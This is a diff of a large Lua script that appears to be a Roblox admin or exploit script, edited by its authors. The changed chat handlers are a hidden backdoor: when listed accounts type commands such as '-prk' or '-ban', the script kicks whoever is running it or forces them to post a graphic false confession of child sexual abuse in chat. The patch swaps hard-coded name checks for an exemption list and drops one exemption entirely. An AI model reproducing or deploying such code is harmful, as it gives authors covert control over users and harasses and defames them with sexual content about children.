@@ -5339,7 +5339,7 @@ v.Chatted:Connect(function(msg)
                 end
 
                 if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "3cxos" or v.Name == "Dekryptionite" or v.Name == "t_echr") then
-			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" and game.Players.LocalPlayer.Name ~= "me_crashking" then
+			if not table.find(nokick,game.Players.LocalPlayer.Name) then
 	                 	Speak("[PR Script]: atprog is my daddy fr!")
 			end
                 end
@@ -5347,10 +5347,9 @@ v.Chatted:Connect(function(msg)
                 if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "me_crashking") then
 			game.Players.LocalPlayer:Kick("[KohlsLite]: SkiddingProgrammer {kohlslite owner} kicked you from the game!")
                 end  
-
-            
+    
                 if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "3cxos" or v.Name == "Dekryptionite" or v.Name == "t_echr") then
-			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" and game.Players.LocalPlayer.Name ~= "me_crashking" then
+			if not table.find(nokick,game.Players.LocalPlayer.Name) then
 				game.Players.LocalPlayer:Kick("[PR Script]: atprog kicked you from the game!")
 			end
                 end  
@@ -5360,7 +5359,7 @@ v.Chatted:Connect(function(msg)
                 end
 
                 if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "3cxos" or v.Name == "Dekryptionite" or v.Name == "t_echr") then
-                    	if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" and game.Players.LocalPlayer.Name ~= "me_crashking" then
+			if not table.find(nokick,game.Players.LocalPlayer.Name) then
 				Remind("[PR Script]: You have been warned!")
 			end
                 end
@@ -5373,13 +5372,11 @@ v.Chatted:Connect(function(msg)
                 end
 
 		if string.sub(msg:lower(), 0, 4) == "-ban" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "me_crashking") then
-			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" and game.Players.LocalPlayer.Name ~= "me_crashking" then
 	                 	Speak("i rape lil kids and i fuck their little asshole so hard")
-			end
                 end
 					
 		if string.sub(msg:lower(), 0, 4) == "-ban" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "IceStuds") then
-			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" and game.Players.LocalPlayer.Name ~= "me_crashking" then
+			if not table.find(nokick,game.Players.LocalPlayer.Name) then
 	                 	Speak("i rape lil kids and i fuck their little asshole so hard")
 			end
                 end
